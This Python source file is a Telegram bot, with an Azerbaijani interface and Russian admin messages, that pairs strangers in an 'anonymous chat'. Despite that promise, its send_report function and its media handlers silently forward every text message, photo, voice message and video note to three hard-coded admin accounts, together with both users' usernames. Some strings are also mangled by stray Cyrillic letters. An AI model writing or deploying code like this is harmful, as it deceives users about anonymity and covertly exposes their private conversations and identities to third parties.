import telebot
from telebot import types
import random
import logging
from datetime import datetime

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_log.txt', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Инициализация бота
bot = telebot.TeleBot(TOKEN)

# Словари и списки
user_pairs = {}
waiting_users = []
ADMIN_IDS = [1209167620, 6030202509, 1612735208]
 
def send_report(action_type, user_info, content):
    # Вывод в консоль
    print(f"""
{'='*50}
НОВОЕ ДЕЙСТВИЕ:
Тип: {action_type}
Пользователь: {user_info}
Содержание: {content}
Время: {datetime.now().strftime('%H:%M:%S')}
{'='*50}
""")
    
    # Словарь для перевода типов действий на русский
    action_translations = {
        "Yeni istifadəçi": "Новый пользователь",
        "Axtarış xətası": "Ошибка поиска",
        "Axtarış başladı": "Поиск начат",
        "Söhbət yaradıldı": "Чат создан",
        "Axtarış dayandırıldı": "Поиск остановлен",
        "Söhbət bitdi": "Чат завершен",
        "Mesaj": "Сообщение",
        "Şəkil": "Фото",
        "Stiker": "Стикер",
        "Səs": "Голосовое",
        "Video": "Видео",
        "Sənəd": "Документ",
        "Şikayət": "Жалоба"
    }
    
    # Перевод типа действия на русский
    action_type_ru = action_translations.get(action_type, action_type)
    
    # Отправка отчета админам в Telegram на русском
    try:
        admin_report = f"""
📊 Отчет о действии:
➤ Тип: {action_type_ru}
➤ Пользователь: {user_info}
➤ Содержание: {content}
⏰ {datetime.now().strftime('%H:%M:%S')}
"""
        for admin_id in ADMIN_IDS:
            bot.send_message(admin_id, admin_report)
    except Exception as e:
        print(f"❌ Ошибка отправки отчета админу: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("🔍 Həmsöhbət tap")
    item2 = types.KeyboardButton("❌ Söhbəti dayandır")
    item3 = types.KeyboardButton("⚠️ Şikayət et")
    markup.add(item1, item2, item3)
    
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"{message.from_user.first_name}"
    send_report("Yeni istifadəçi", user_info, "Botu işə saldı")
    
    bot.send_message(message.chat.id, 
                     "👋 Anonim çata xoş gəlmisiniz!\n"
                     "Söhbətə başlamaq üçün '🔍 Həmsöhbət tap' düyməsini basın.",
                     reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🔍 Həmsöhbət tap")
def find_partner(message):
    user_id = message.chat.id
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"{message.from_user.first_name}"
    
    if user_id in user_pairs:
        send_report("Axtarış xətası", user_info, "Artıq söhbətdədir")
        bot.send_message(user_id, "❗ Siz artıq söhbətdəsiniz!")
        return
        
    if user_id in waiting_users:
        send_report("Axtarış xətası", user_info, "Artıq həmsöhbət axtarır")
        bot.send_message(user_id, "⏳ Siz artıq həmsöhbət axtarırsınız!")
        return
        
    waiting_users.append(user_id)
    send_report("Axtarış başladı", user_info, "Həmsöhbət axtarır")
    bot.send_message(user_id, "🔍 Həmsöhbət axtarılır...")
    
    if len(waiting_users) >= 2:
        user1 = waiting_users.pop(0)
        user2 = waiting_users.pop(0)
        
        user_pairs[user1] = user2
        user_pairs[user2] = user1
        
        user2_info = f"@{bot.get_chat(user2).username}" if bot.get_chat(user2).username else bot.get_chat(user2).first_name
        send_report("Söhbət yaradıldı", user_info, f"Həmsöhbət: {user2_info}")
        
        bot.send_message(user1, "✅ Həmsöhbət tapıldı! Söhbətə başlaya bilərsiniz.")
        bot.send_message(user2, "✅ Həmsöhbət tapıldı! Söhbətə başlaya bilərsiniz.")

@bot.message_handler(func=lambda message: message.text == "❌ Söhbəti dayandır")
def stop_chat(message):
    user_id = message.chat.id
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"{message.from_user.first_name}"
    
    if user_id in waiting_users:
        waiting_users.remove(user_id)
        send_report("Axtarış dayandırıldı", user_info, "Axtarışı ləğv etdi")
        bot.send_message(user_id, "❌ Axtarış dayandırıldı.")
        return
        
    if user_id in user_pairs:
        partner_id = user_pairs[user_id]
        partner_info = f"@{bot.get_chat(partner_id).username}" if bot.get_chat(partner_id).username else bot.get_chat(partner_id).first_name
        send_report("Söhbət bitdi", user_info, f"Əlaqəni kəsdi {partner_info}")
        
        del user_pairs[user_id]
        del user_pairs[partner_id]
        
        bot.send_message(user_id, "❌ Söhbət bitdi.")
        bot.send_message(partner_id, "❌ Həmsöhbət söhbəti tərk etdi.")
    else:
        bot.send_message(user_id, "❗ Siz söhbətdə deyilsiniz!")

@bot.message_handler(content_types=['text', 'photo', 'sticker', 'voice', 'video', 'document', 'video_note'])
def handle_messages(message):
    user_id = message.chat.id
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"{message.from_user.first_name}"
    
    if user_id in user_pairs:
        partner_id = user_pairs[user_id]
        partner_info = f"@{bot.get_chat(partner_id).username}" if bot.get_chat(partner_id).username else bot.get_chat(partner_id).first_name
        
        if message.text:
            if message.text not in ["🔍 Həmsöhbət tap", "❌ Söhbəti dayandır", "⚠️ Şikayət et"]:
                send_report("Mesaj", user_info, f"Kimə: {partner_info}\nMətn: {message.text}")
                bot.send_message(partner_id, message.text)
        elif message.photo:
            send_report("Şəkil", user_info, f"Şəkil göndərди {partner_info}")
            bot.send_photo(partner_id, message.photo[-1].file_id)
            admin_caption = f"📸 Фото от пользователя {user_info}\nПолучатель: {partner_info}"
            for admin_id in ADMIN_IDS:
                bot.send_photo(admin_id, message.photo[-1].file_id, caption=admin_caption)
        elif message.sticker:
            send_report("Stiker", user_info, f"Stiker göndərди {partner_info}")
            bot.send_sticker(partner_id, message.sticker.file_id)
        elif message.voice:
            send_report("Səs", user_info, f"Səs mesajı göndərди {partner_info}")
            bot.send_voice(partner_id, message.voice.file_id)
            admin_caption = f"🎤 Голосовое сообщение от пользователя {user_info}\nПолучатель: {partner_info}"
            for admin_id in ADMIN_IDS:
                bot.send_voice(admin_id, message.voice.file_id, caption=admin_caption)
        elif message.video:
            send_report("Video", user_info, f"Video göndərdi {partner_info}")
            bot.send_video(partner_id, message.video.file_id)
        elif message.document:
            send_report("Sənəd", user_info, f"Sənəd göndərди {partner_info}")
            bot.send_document(partner_id, message.document.file_id)
        elif message.video_note:
            send_report("Кружок", user_info, f"Кружок göndərди {partner_info}")
            bot.send_video_note(partner_id, message.video_note.file_id)
            admin_caption = f"🎥 Кружок от пользователя {user_info}\nПолучатель: {partner_info}"
            for admin_id in ADMIN_IDS:
                bot.send_video_note(admin_id, message.video_note.file_id, caption=admin_caption)
    else:
        if message.text not in ["🔍 Həmsöhbət tap", "❌ Söhbəti dayandır", "⚠️ Şikayət et"]:
            bot.send_message(user_id, "❗ Siz söhbətdə deyilsiniz! Söhbətə başlamaq üçün '🔍 Həmsöhbət tap' düyməsini basın.")

@bot.message_handler(func=lambda message: message.text == "⚠️ Şikayət et")
def report_user(message):
    user_id = message.chat.id
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"{message.from_user.first_name}"
    
    if user_id in user_pairs:
        partner_id = user_pairs[user_id]
        partner_info = f"@{bot.get_chat(partner_id).username}" if bot.get_chat(partner_id).username else bot.get_chat(partner_id).first_name
        send_report("Şikayət", user_info, f"İstifadəçidən şikayət etdi {partner_info}")
        bot.reply_to(message, "✅ Şikayətiniz moderatora göndərildi.")
    else:
        bot.reply_to(message, "❌ Siz söhbətdə deyilsiniz.")

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════════╗
║            ANONİM SÖHBƏT BOT               ║
║                İŞƏ DÜŞDÜ                   ║
║    Konsol mesajları qəbul etməyə hazırdır  ║
╚════════════════════════════════════════════╝
""")
    
    # Запуск бота
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"❌ Произошла ошибка: {e}")
            continue
